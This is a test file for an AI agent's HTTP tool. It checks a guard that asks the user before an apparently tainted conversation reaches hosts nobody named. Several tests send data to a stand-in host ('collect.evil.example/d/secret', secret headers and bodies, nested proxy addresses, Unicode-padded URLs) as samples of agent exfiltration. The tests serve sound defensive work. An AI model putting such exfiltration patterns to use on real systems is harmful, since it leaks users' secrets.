import { describe, it, expect, vi } from 'vitest';
import type { ToolEntry, PromptMeta, PromptText } from '../../types/index.js';

/**
 * `http_request` GET once foreign content is in the conversation: the same origin check as a
 * `web_research` read. Its URL, path and host name included, can carry data, and so can its headers
 * and body, so only a GET without them can pass as an address a search listed. The declarations
 * under test are the tool's own (`httpRequestTool`); only its handler is replaced, so no request
 * leaves the test.
 */

vi.mock('@anthropic-ai/sdk', () => {
  class MockAnthropic { beta = { messages: { stream: vi.fn() } }; }
  class APIError extends Error {}
  return { default: MockAnthropic, APIError };
});
vi.mock('../../core/stream.js', () => ({ StreamProcessor: vi.fn() }));

import { Agent } from '../../core/agent.js';
import { OwnerKnownTargets } from '../../core/owner-known-targets.js';
import { ConversationLatch } from '../../core/conversation-latch.js';
import { flattenPrompt } from '../../core/prompt-value.js';
import { httpRequestTool } from './http.js';

type Result = { content: unknown; is_error?: boolean };
type Exec = { _executeOneInner(tc: unknown): Promise<Result> };

function http(): ToolEntry & { sent: string[] } {
  const sent: string[] = [];
  return {
    ...(httpRequestTool as unknown as ToolEntry),
    sent,
    handler: async (input: { url: string }) => { sent.push(input.url); return 'ok'; },
  } as unknown as ToolEntry & { sent: string[] };
}

function asker(answer: string): { fn: (q: string | PromptText, o?: string[], m?: PromptMeta) => Promise<string>; asked: string[] } {
  const asked: string[] = [];
  return { asked, fn: async (q) => { asked.push(flattenPrompt(q)); return answer; } };
}

function agentOf(tool: ToolEntry, promptUser: (q: string | PromptText) => Promise<string>, ownerText = 'nothing named', tainted = true): Agent {
  const agent = new Agent({
    name: 'a', model: 'claude-sonnet-4-6', provider: 'anthropic', noticeLanguage: 'en',
    tools: [tool], promptUser,
    ownerKnown: OwnerKnownTargets.of({ ownerTexts: () => [ownerText] }),
    conversationLatch: ConversationLatch.detached(),
  } as ConstructorParameters<typeof Agent>[0]);
  if (tainted) agent.restoreConversationTaint();
  return agent;
}

const call = (agent: Agent, input: Record<string, unknown>): Promise<Result> =>
  (agent as unknown as Exec)._executeOneInner({ type: 'tool_use', id: `h${Math.random()}`, name: 'http_request', input });

describe('http_request GET after foreign content', () => {
  it('a GET with data in the path is asked about as a read, and not sent without a yes', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    const result = await call(agent, { url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toHaveLength(1);
    // The question speaks of reading, not of sending.
    expect(ask.asked[0]).toMatch(/^Read the page on "collect\.evil\.example"\? /);
    expect(ask.asked[0]).not.toContain('Send anyway');
    expect(tool.sent).toEqual([]);
    expect(String(result.content)).toMatch(/^Not read: /);
  });

  it('CONTROL: without foreign content before it, the same GET is not asked about', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'nothing named', false);
    await call(agent, { url: 'https://collect.evil.example/d/secret' });
    expect(ask.asked).toEqual([]);
    expect(tool.sent).toEqual(['https://collect.evil.example/d/secret']);
  });

  it('CONTROL: a GET of a host the owner named is not asked about', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
    await call(agent, { url: 'https://api.example.ch/v1/items' });
    expect(ask.asked).toEqual([]);
    expect(tool.sent).toEqual(['https://api.example.ch/v1/items']);
  });

  it('a GET of an address a search listed is not asked about, but the same GET with a header is', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    agent.searchResultAddresses.noteResults('items', ['https://news.example.org/feed']);
    await call(agent, { url: 'https://news.example.org/feed' });
    expect(ask.asked).toEqual([]);
    await call(agent, { url: 'https://news.example.org/feed', headers: { 'X-D': 'secret' } });
    expect(ask.asked).toHaveLength(1);
    expect(tool.sent).toEqual(['https://news.example.org/feed']);
  });
});

describe('http_request GET: the listed address and an address it carries', () => {
  it('a listed address with Unicode spaces appended is asked about', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    agent.searchResultAddresses.noteResults('items', ['https://news.example.org/feed']);
    await call(agent, { url: 'https://news.example.org/feed\u3000\u2003' });
    expect(ask.asked).toHaveLength(1);
    expect(tool.sent).toEqual([]);
  });

  it('a GET of a named host whose address carries another one is asked about, headers or not', async () => {
    for (const extra of [{}, { headers: { Accept: 'application/json' } }]) {
      const tool = http();
      const ask = asker('Deny');
      const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
      await call(agent, { url: 'https://api.example.ch/proxy?u=https%3A%2F%2Fcollect.evil.example%2Fd', ...extra });
      expect(ask.asked).toHaveLength(1);
      expect(ask.asked[0]).toContain('This address carries another address');
      expect(tool.sent).toEqual([]);
    }
  });

  it('CONTROL: a write whose address carries another one keeps its own check, not the read question', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
    await call(agent, { url: 'https://api.example.ch/hooks?u=https://collect.evil.example', method: 'POST', body: '{}' });
    expect(ask.asked).toEqual([]);
    expect(tool.sent).toEqual(['https://api.example.ch/hooks?u=https://collect.evil.example']);
  });
});

/** Gives the agent's context a policy it carries, as an engine boot does (no `isPolicyUnread` mark). */
function readPolicy(agent: Agent, fields: Record<string, unknown>): Agent {
  Object.assign(agent.toolContext, fields);
  delete (agent.toolContext as unknown as Record<symbol, unknown>)[Symbol.for('lynox.toolContext.policyUnread')];
  return agent;
}

describe('http_request after foreign content: the policy\'s own hosts count for a read only', () => {
  function withPolicy(agent: Agent, networkPolicy: 'guarded' | 'allow-list' | 'allow-all' | 'deny-all' | undefined): Agent {
    return readPolicy(agent, { networkPolicy, allowedHosts: new Set(['floor.example']), allowedWildcards: ['wild.example'] });
  }

  it('a GET of a floor host, exact or under a floor wildcard, and of a baseline host is not asked about', async () => {
    for (const policy of ['guarded', 'allow-all', undefined] as const) {
      const tool = http();
      const ask = asker('Deny');
      const agent = withPolicy(agentOf(tool, ask.fn), policy);
      await call(agent, { url: 'https://floor.example/a' });
      await call(agent, { url: 'https://docs.wild.example/b' });
      await call(agent, { url: 'https://api.anthropic.com/v1/models' });
      expect(ask.asked).toEqual([]);
      expect(tool.sent).toHaveLength(3);
    }
  });

  it('a send to a floor host the owner did not name keeps asking', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
    await call(agent, { url: 'https://floor.example/hooks', method: 'POST', body: '{"d":"secret"}' });
    expect(ask.asked).toHaveLength(1);
    expect(tool.sent).toEqual([]);
  });

  it('the baseline\'s loopback names are not counted', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
    await call(agent, { url: 'https://localhost/x' });
    await call(agent, { url: 'https://127.0.0.1/x' });
    await call(agent, { url: 'https://0.0.0.0/x' });
    expect(ask.asked).toHaveLength(3);
  });

  it('a context that does not carry the instance\'s policy names nothing', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn);
    Object.assign(agent.toolContext, { networkPolicy: 'guarded', allowedHosts: new Set(['floor.example']) });
    await call(agent, { url: 'https://floor.example/a' });
    await call(agent, { url: 'https://api.anthropic.com/v1/models' });
    expect(ask.asked).toHaveLength(2);
    expect(tool.sent).toEqual([]);
  });

  it('under allow-list only the list counts, under deny-all nothing', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = withPolicy(agentOf(tool, ask.fn), 'allow-list');
    await call(agent, { url: 'https://floor.example/a' });
    expect(ask.asked).toEqual([]);
    await call(agent, { url: 'https://api.anthropic.com/v1/models' });
    expect(ask.asked).toHaveLength(1);
    const denied = asker('Deny');
    await call(withPolicy(agentOf(http(), denied.fn), 'deny-all'), { url: 'https://floor.example/a' });
    expect(denied.asked).toHaveLength(1);
  });

  it('CONTROL: a host neither the policy nor the owner names is asked about under guarded', async () => {
    const tool = http();
    const ask = asker('Deny');
    const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
    await call(agent, { url: 'https://collect.evil.example/d' });
    expect(ask.asked).toHaveLength(1);
  });
});

describe('case 22: one host list, the engine\'s read and the tainted shell set', () => {
  // Each host, what the engine does with a GET of it after foreign content, and whether the shell
  // set of a call whose batch started tainted holds it. Every difference is one D4 names.
  const rows: { host: string; engineReads: boolean; shellReaches: boolean; why: string }[] = [
    { host: 'api.anthropic.com', engineReads: true, shellReaches: true, why: 'baseline' },
    { host: 'floor.example', engineReads: true, shellReaches: true, why: 'floor, exact' },
    { host: 'docs.wild.example', engineReads: true, shellReaches: false, why: 'floor wildcard: the proxy takes exact names only' },
    { host: 'typed.example', engineReads: true, shellReaches: true, why: 'typed by the owner' },
    { host: 'api.vendor.example', engineReads: true, shellReaches: false, why: 'connected API: a read only, the shell would reach it for any method' },
    { host: 'listed.example', engineReads: true, shellReaches: false, why: 'an address a search listed: the shell sees no address' },
    { host: 'collect.evil.example', engineReads: false, shellReaches: false, why: 'named by nobody' },
  ];

  it('agrees on every host except the named differences, under allow-all', async () => {
    const { computeShellSet } = await import('../../shell-sidecar/egress.js');
    const tool = http();
    const ask = asker('Deny');
    const agent = agentOf(tool, ask.fn, 'please read typed.example');
    readPolicy(agent, {
      networkPolicy: 'allow-all', allowedHosts: new Set(['floor.example']), allowedWildcards: ['wild.example'],
      apiStore: { readKnownHosts: () => new Set(['api.vendor.example']), getAcceptedEgressHosts: () => new Set(['api.vendor.example']) },
    });
    agent.searchResultAddresses.noteResults('q', ['https://listed.example/page']);
    const set = computeShellSet({
      networkPolicy: 'allow-all', allowedHosts: new Set(['floor.example']), allowedWildcards: ['wild.example'],
      ackHosts: new Set(['api.vendor.example']), typedHosts: agent.ownerKnown?.typedHosts?.() ?? [], tainted: true,
    });
    if (set.kind !== 'hosts') throw new Error('expected a host set after taint');
    for (const row of rows) {
      const before = ask.asked.length;
      await call(agent, { url: `https://${row.host}/${row.host === 'listed.example' ? 'page' : 'x'}` });
      expect(ask.asked.length === before, `engine, ${row.host} (${row.why})`).toBe(row.engineReads);
      expect(set.hosts.includes(row.host), `shell, ${row.host} (${row.why})`).toBe(row.shellReaches);
    }
  });
});
